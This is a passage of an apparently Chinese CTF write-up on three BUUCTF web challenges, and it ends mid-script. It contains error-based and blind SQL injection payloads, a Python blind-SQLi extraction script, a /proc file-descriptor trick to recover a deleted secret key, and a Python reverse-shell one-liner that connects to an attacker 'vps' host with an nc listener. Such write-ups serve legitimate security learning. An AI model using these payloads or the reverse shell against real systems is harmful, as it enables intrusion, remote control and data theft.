<p><strong>这里注意到<code>confirm</code>中对<code>address</code>参数是没有过滤的</strong>, 这里后续的操作是将用户提交的<code>user_name</code>, <code>address</code>, <code>phone</code>加入到数据表中(23行)</p>
<p>在<code>change</code>的21行, 执行更新<code>address</code>功能时会从表中查询之前存进去的<code>address</code>,也就是 <code>old_address</code>&#x3D;<code>$row[&#39;address&#39;]</code></p>
<p>那么如果我们在<code>confirm</code>中将payload提交到不经过滤的<code>address</code>中, 然后让它存进表里</p>
<p>在<code>change</code>中就可能会出现报错</p>
<p>使用报错注入: 这里先将参数提交给<code>confirm.php</code>,然后去<code>change</code>中,输入同样的用户名和密码,触发查询,查看报错信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">user_name=qqq&amp;phone=111&amp;address=3&#x27;&amp;&amp;extractvalue(1,concat(0x7e,(database()),0x7e))#</span><br><span class="line">user_name=qq&amp;phone=11&amp;address=&#x27; and extractvalue(1,concat(0x7e,(database()),0x7e))#</span><br><span class="line">访问change.php输入前面的name和phone后, 输出:errorXPATH syntax error: &#x27;~ctfusers~&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">user_name=xc&amp;phone=234&amp;address=&#x27; and extractvalue(1,concat(0x7e,(select load_file(&#x27;/flag.txt&#x27;)),0x7e))#</span><br><span class="line">访问change.php输入前面的name和phone后,输出:errorXPATH syntax error: &#x27;~flag&#123;e62bb712-dc5d-4f48-bd21-87&#x27;</span><br><span class="line"></span><br><span class="line">user_name=xccc&amp;phone=2344&amp;address=&#x27; and extractvalue(1,concat(0x7e,(select replace((select load_file(&#x27;/flag.txt&#x27;)),&quot;e62bb712-dc5d-4f48-bd21-87&quot;,&quot;&quot;)),0x7e))#</span><br><span class="line">访问change.php输入前面的name和phone后输出: flag&#123;58112d0ecf&#125;</span><br><span class="line">那么拼接成最后的flag:</span><br><span class="line">flag&#123;e62bb712-dc5d-4f48-bd21-8758112d0ecf&#125;</span><br></pre></td></tr></table></figure>





<br>

<hr>
<br>

<h1 id="proc-python反弹shell-PicDown"><a href="#proc-python反弹shell-PicDown" class="headerlink" title="[proc,python反弹shell]PicDown"></a>[proc,python反弹shell]PicDown</h1><p>就给了一个输入框,根据参数名的话这里是让输入url</p>
<p>这里输入以下百度,能够直接下载网页源码:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">page?url=http://www.baidu.com</span><br></pre></td></tr></table></figure>

<p>接着尝试使用<code>http://</code>或<code>file://</code>读取本地文件, 都没有成功, 但是这里直接输入文件名竟然能下载:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">page?url=/etc/passwd</span><br><span class="line">page?url=/flag</span><br></pre></td></tr></table></figure>

<p>这里直接把flag下载下来了…</p>
<p>后来看wp,可能是buu这里的环境有点问题,正常的流程应该是:</p>
<p>读取<code>/proc/self/cmdline</code>,获取启动当前环境的完整命令:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">url=/proc/self/cmdline</span><br><span class="line">url=../../../../../../proc/self/cmdline</span><br><span class="line">内容:</span><br><span class="line">python2 app.py </span><br></pre></td></tr></table></figure>

<p>读取<code>app.py</code>:  <code>page?url=app.py</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">SECRET_FILE = <span class="string">&quot;/tmp/secret.txt&quot;</span></span><br><span class="line">f = <span class="built_in">open</span>(SECRET_FILE)</span><br><span class="line">SECRET_KEY = f.read().strip() <span class="comment"># strip移除前后的空白字符</span></span><br><span class="line">os.remove(SECRET_FILE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;search.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/page&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">page</span>():</span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> url.lower().startswith(<span class="string">&quot;file&quot;</span>): <span class="comment"># 这里url不能为file开头,这也解释了为什么一开始用file://不管用</span></span><br><span class="line">            res = urllib.urlopen(url)</span><br><span class="line">            value = res.read()</span><br><span class="line">            response = Response(value, mimetype=<span class="string">&#x27;application/octet-stream&#x27;</span>)</span><br><span class="line">            response.headers[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;attachment; filename=beautiful.jpg&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            value = <span class="string">&quot;HACK ERROR!&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        value = <span class="string">&quot;SOMETHING WRONG!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;search.html&#x27;</span>, res=value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/no_one_know_the_manager&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">manager</span>():</span><br><span class="line">    key = request.args.get(<span class="string">&quot;key&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(SECRET_KEY)</span><br><span class="line">    <span class="keyword">if</span> key == SECRET_KEY:</span><br><span class="line">        shell = request.args.get(<span class="string">&quot;shell&quot;</span>)</span><br><span class="line">        os.system(shell)</span><br><span class="line">        res = <span class="string">&quot;ok&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res = <span class="string">&quot;Wrong Key!&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure>

<p>程序开始运行时,会从<code>/tmp/secret.txt</code>获取一个<code>SECRET_KEY</code>值, 然后将该文件删除</p>
<p>访问<code>/no_one_know_the_manager</code>这个路由时, 会让我们输入一个<code>key</code>如果等于<code>SECRET_KEY</code>,就可以执行我们输入的命令</p>
<p>现在问题就是如何获取这个<code>SECRET_KEY</code></p>
<blockquote>
<p><strong>但在 linux 系统中如果一个程序用<code>open()</code>打开了一个文件但最终没有关闭他，即便从外部（例如如<code>os.remove(SECRET_FILE)</code>）删除这个文件之后，在 <code>/proc</code> 这个进程的 <code>pid</code> 目录下的 <code>fd</code> 文件描述符目录下还是会有这个文件的文件描述符，通过这个文件描述符我们即可得到被删除文件的内容</strong>。<code>/proc/[pid]/fd</code> 这个目录里包含了进程打开文件的情况，目录里面有一堆<code>/proc/[pid]/fd/id</code>文件</p>
<p><span style='color:black;background:yellow;font-family:hei;font-weight:bold'>对于当前运行的程序本身,我们通过<code>self</code>就能够取到其本身的<code>pid</code>,那么接下来就可以通过爆破<code>id</code>来获取我们需要的文件描述符<code>/proc/self/fd/[id]</code></span></p>
<p>当一个新进程建立时，此进程将默认有 0，1，2 的文件描述符,分别代表标准输入,标准输出,标准错误输出</p>
<p>那么当打开一个新文件时,文件描述符会从3开始</p>
</blockquote>
<p>这里直接试了一下,<code>id=3</code>即找到了该文件并下载, 得到<code>SECRET_KEY</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">page?url=/proc/self/fd/3</span><br><span class="line">vv4RKbyjTqO/VtyoIAkBGyKrzDp27GbPQc0Ur1hCfbw=</span><br></pre></td></tr></table></figure>

<p>能够通过检测:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/no_one_know_the_manager?key=vv4RKbyjTqO/VtyoIAkBGyKrzDp27GbPQc0Ur1hCfbw=&amp;shell=ls</span><br></pre></td></tr></table></figure>

<p>但是这里并不会回显命令执行的结果</p>
<p>这里需要使用<code>python</code>反弹获得shell, 这里让目标执行如下命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;监听主机的ip&#x27;,监听主机的端口));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span><br></pre></td></tr></table></figure>

<p>这里的代码为:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import os,socket</span><br><span class="line">subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);</span><br><span class="line">s.connect((&#x27;监听主机的ip&#x27;,监听主机的端口))</span><br><span class="line">os.dup2(s.fileno(),0)</span><br><span class="line">os.dup2(s.fileno(),1)</span><br><span class="line">os.dup2(s.fileno(),2)</span><br><span class="line">p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;])</span><br></pre></td></tr></table></figure>

<p>然后在我们能够控制的监听主机上使用:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 端口号 </span><br></pre></td></tr></table></figure>

<p>开启监听, 就能够获得目标主机的<code>shell</code>了</p>
<p>payload: (这里还需要将下面的shell中的值url编码)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/no_one_know_the_manager?key=JLAwm2xCtqkgNGJTHgPPocxTSLbWX4q7FVxQDxFCi/w=&amp;shell=python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;vps&quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure>



<br>

<hr>
<br>

<h1 id="bak泄露-盲注-踩坑多-php短标签上传-Easyweb"><a href="#bak泄露-盲注-踩坑多-php短标签上传-Easyweb" class="headerlink" title="[bak泄露,盲注(踩坑多),php短标签上传]Easyweb"></a>[bak泄露,盲注(踩坑多),php短标签上传]Easyweb</h1><p><img src="/../images/buuctf-web3/image-20221027155154807.png" alt="image-20221027155154807"></p>
<p><code>image.php</code>根据<code>id</code>显示不同的图片</p>
<p>看到输入框,先找了半天注入点…..</p>
<p>访问<code>robots.txt</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: *.php.bak</span><br></pre></td></tr></table></figure>

<p>经过尝试,可以下载<code>image.php.bak</code>:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;﻿?php</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>])?<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]:<span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$path</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;path&quot;</span>])?<span class="variable">$_GET</span>[<span class="string">&quot;path&quot;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$id</span>); <span class="comment">//给单双引号前面加上反斜杠</span></span><br><span class="line"><span class="variable">$path</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$path</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="string">&quot;select * from images where id=&#x27;<span class="subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="subst">&#123;$path&#125;</span>&#x27;&quot;</span>);</span><br><span class="line"><span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line"><span class="variable">$path</span>=<span class="string">&quot;./&quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;path&quot;</span>];</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: image/jpeg&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="variable">$path</span>);</span><br></pre></td></tr></table></figure>

<p>这里<code>addslashes</code>的作用是给单引号,双引号,反斜杠前面再加一个反斜杠来转义</p>
<p>而10,11行这里,将<code>\\0</code>等字符替换成了空字符 两者一起使用,就产生了漏洞</p>
<p>例如如果输入<code>id=\\0</code>, <code>addslashes</code>会将其变成<code>\\\0</code> (这里相当于第一个<code>\</code>将第二个<code>\</code>转义为了一般字符)</p>
<p>然后<code>str_replace</code>又删除了<code>\\0</code>,那么id最后还剩下一个<code>\</code></p>
<p>可以在本地验证一下:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;\\0&#x27;</span>;</span><br><span class="line"><span class="variable">$path</span> = <span class="string">&#x27; or 1=1 %23&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$id</span>); <span class="comment">//给单双引号前面加上反斜杠</span></span><br><span class="line"><span class="variable">$path</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$path</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select * from images where id=&#x27;<span class="subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="subst">&#123;$path&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$id</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$path</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$query</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\</span><br><span class="line">or 1=1 %23</span><br><span class="line">select * from images where id=&#x27;\&#x27; or path=&#x27; or 1=1 %23&#x27;</span><br></pre></td></tr></table></figure>

<p>所以当<code>id=\\0</code>,<code>path= or 1=1 %23</code>时  </p>
<p><code>id</code>后面得那个反斜线将单引号转义, <code>id</code>前面得那个单引号不得不和<code>path</code>后面的单引号配对, 整个语句变成了:</p>
<p><code>id</code> &#x3D;  <code>\&#39; or path=</code></p>
<p><code>or</code></p>
<p><code>1=1</code></p>
<p>这种形式,也就有了通过逻辑进行注入的可能性</p>
<p>测试一下库名的长度</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=\\0&amp;path= or (length(database())=10) %23    成功显示了图片,说明长度为1</span><br></pre></td></tr></table></figure>

<p>爆库名: <code>ciscnfinal</code></p>
<p>爆表名:<code>images,users</code></p>
<p>爆列名: <code>username,password</code></p>
<p>密码: <code>ae6191ca06c72dfb42aa</code></p>
<p>脚本:</p>
<p>注意,这里踩了好久的坑…    这里查询语句里好像不能使用引号包裹特殊字段,否则会已知导致整个语句的值为0或1</p>
<p>例如</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;path&quot;:&quot; or (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name= &#x27;users&#x27; and table_schema=database()),&#123;&#125;,1))=&#123;&#125;) #&quot;</span><br><span class="line">这里users使用了引号, 导致脚本已知跑不出来</span><br><span class="line">所以把这里的users转换成16进制</span><br><span class="line">&quot;path&quot;:&quot; or (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name= 0x7573657273 and table_schema=database()),&#123;&#125;,1))=&#123;&#125;) #&quot;</span><br><span class="line">另外,在对substr取出的字符进行比对时,为了避免使用引号, 也将其转化为ascii码值再比较</span><br></pre></td></tr></table></figure>

<p>脚本:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">chars = string.printable[:]  <span class="comment">#返回所有可打印的字母，数字，符号的集合</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">base_url = <span class="string">&quot;http://b9f4d0a2-000c-4afa-bc53-2eaf797667e9.node4.buuoj.cn:81/image.php&quot;</span></span><br><span class="line">session = requests.session()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_database_name</span>(<span class="params">length</span>):</span><br><span class="line">    database_name = <span class="string">&quot;&quot;</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; length+<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> chars:</span><br><span class="line">            params = &#123;</span><br><span class="line">                <span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;\\0&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;path&#x27;</span>: <span class="string">&quot; or (ascii(substr(database(),&#123;&#125;,1))=&#123;&#125;) #&quot;</span>.<span class="built_in">format</span>(i, <span class="built_in">ord</span>(c))</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">#print(params[&#x27;path&#x27;])</span></span><br><span class="line">            <span class="comment">#print(base_url)</span></span><br><span class="line">            res = session.get(base_url, params=params).text</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">len</span>(res))</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(res) == <span class="number">117007</span> :</span><br><span class="line">                database_name += c</span><br><span class="line">                <span class="built_in">print</span>(database_name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_table_name</span>():</span><br><span class="line">    table_name = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> chars:</span><br><span class="line">            params = &#123;</span><br><span class="line">                <span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;\\0&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;path&#x27;</span>: <span class="string">&quot; or (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))=&#123;&#125;) #&quot;</span>.<span class="built_in">format</span>(i, <span class="built_in">ord</span>(c))</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment"># print(params[&#x27;path&#x27;])</span></span><br><span class="line">            <span class="comment"># print(base_url)</span></span><br><span class="line">            <span class="comment"># time.sleep(0.5)</span></span><br><span class="line">            res = session.get(base_url, params=params).text</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">len</span>(res))</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(res) == <span class="number">117007</span> :</span><br><span class="line">                table_name += c</span><br><span class="line">                <span class="built_in">print</span>(table_name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_column_name</span>():</span><br><span class="line">    column_name = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> chars:</span><br><span class="line"></span><br><span class="line">            params = &#123;</span><br><span class="line">                <span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;\\0&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;path&#x27;</span>: <span class="string">&quot; or (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name= 0x7573657273 and table_schema=database()),&#123;&#125;,1))=&#123;&#125;) #&quot;</span>.<span class="built_in">format</span>(i, <span class="built_in">ord</span>(c))</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment"># print(params[&#x27;path&#x27;])</span></span><br><span class="line">            <span class="comment"># print(base_url)</span></span><br><span class="line">            <span class="comment"># time.sleep(0.5)</span></span><br><span class="line">            res = session.get(base_url, params=params).text</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(i)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(res))+<span class="string">&#x27; &#x27;</span>+c)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(res) == <span class="number">117007</span> :</span><br><span class="line">                column_name += c</span><br><span class="line">                <span class="built_in">print</span>(column_name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>():</span><br><span class="line">    data = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> chars:</span><br><span class="line"></span><br><span class="line">            params = &#123;</span><br><span class="line">                <span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;\\0&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;path&#x27;</span>: <span class="string">&quot; or (ascii(substr((select group_concat(password) from users),&#123;&#125;,1))=&#123;&#125;) #&quot;</span>.<span class="built_in">format</span>(i, <span class="built_in">ord</span>(c))</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment"># print(params[&#x27;path&#x27;])</span></span><br><span class="line">            <span class="comment"># print(base_url)</span></span><br><span class="line">            <span class="comment"># time.sleep(0.5)</span></span><br><span class="line">            res = session.get(base_url, params=params).text</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(i)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(res))+<span class="string">&#x27; &#x27;</span>+c)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(res) == <span class="number">117007</span> :</span><br><span class="line">                data += c</span><br><span class="line">                <span class="built_in">print</span>(data)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#get_database_name(10)</span></span><br><span class="line"><span 